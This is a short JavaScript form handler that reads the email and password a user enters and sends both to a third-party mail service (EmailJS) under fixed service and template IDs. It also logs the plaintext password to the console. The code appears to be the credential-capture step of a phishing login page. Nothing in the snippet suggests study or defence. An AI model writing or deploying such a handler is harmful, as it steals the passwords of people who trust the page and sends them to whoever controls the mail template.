function sendMail(){
    let params ={
        email: document.getElementById('email').value,
        password: document.getElementById('password').value
    }
    console.log(params);
    const serviceID = 'service_7617z8s';
    const templateID = 'template_sf5yfy1';
    emailjs.send(serviceID, templateID, params)
    .then(res => console.log(res.status))
    .catch(err => console.log(err))

}